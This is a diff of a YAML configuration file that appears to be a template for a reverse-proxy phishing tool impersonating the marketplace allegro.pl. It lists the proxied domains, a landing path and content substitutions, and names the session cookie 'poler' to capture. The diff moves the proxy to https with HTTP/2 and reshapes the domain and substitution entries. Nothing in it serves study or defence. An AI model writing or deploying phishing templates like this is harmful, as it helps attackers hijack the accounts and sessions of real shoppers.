@@ -1,14 +1,15 @@
 creator: '@hash3liZer'
 name: 'allegro2'
-proto: 'http'
+proto: 'https'
+http_version: '2.0'
 landing: 'www.allegro.url/comeon'
 
-subdomains:
-  - {substitution: '', original: '', domain: 'allegro.pl'}
-  - {substitution: 'www', original: 'www', domain: 'allegro.pl'}
+domains:
+  - 'allegro.pl'
+  - 'allegro.com'
 
 substitutions:
-  - {host: 'www.allegro.pl', search: '', replace: '', content: ''}
+  - {domain: 'allegro.pl', search: '', replace: '', content_type: 'all'}
 
 cookies:
   - 'poler'
